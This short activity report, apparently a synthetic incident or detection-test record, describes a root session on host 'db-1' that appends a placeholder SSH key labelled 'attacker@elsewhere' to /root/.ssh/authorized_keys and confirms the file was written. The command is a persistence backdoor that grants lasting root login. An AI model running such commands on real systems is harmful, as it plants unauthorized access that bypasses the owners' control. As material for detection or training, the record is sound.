1. Activity story

The activity runs as `root` from `db-1`, directed at `db-1`.
It began at 2026-07-27T20:17:28+00:00 and finished at 2026-07-27T20:17:30+00:00.

2. What was executed

Step 1 — on `db-1` as `root`, from 2026-07-27T20:17:28+00:00 to 2026-07-27T20:17:30+00:00 (exit status 0):

    mkdir -p /root/.ssh && chmod 700 /root/.ssh
    ts=$(date +%s)
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAAD_fake_key_0_${ts}_attacker attacker@elsewhere" \
      >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
    ls -la /root/.ssh/authorized_keys

It printed:

    -rw------- 1 root root 237 Jul 27 20:17 /root/.ssh/authorized_keys
